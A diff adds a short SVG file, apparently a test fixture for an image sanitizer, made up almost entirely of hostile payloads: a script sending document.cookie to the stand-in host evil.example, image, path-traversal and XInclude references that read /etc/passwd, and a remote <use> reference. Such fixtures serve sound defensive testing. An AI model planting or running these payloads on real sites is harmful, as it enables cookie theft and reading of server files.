@@ -1,0 +1,9 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:xi="http://www.w3.org/2001/XInclude" width="200" height="200">
+  <script>fetch("http://evil.example/exfil?" + document.cookie)</script>
+  <image xlink:href="file:///etc/passwd" x="0" y="0" width="100" height="100"/>
+  <image href=".//../../../../etc/passwd" x="0" y="0" width="100" height="100"/>
+  <xi:include href="/etc/passwd" parse="text"/>
+  <use xlink:href="http://evil.example/remote.svg#x"/>
+  <foreignObject width="100" height="100"><div>hi</div></foreignObject>
+  <rect x="10" y="10" width="50" height="50" fill="#000"/>
+</svg>
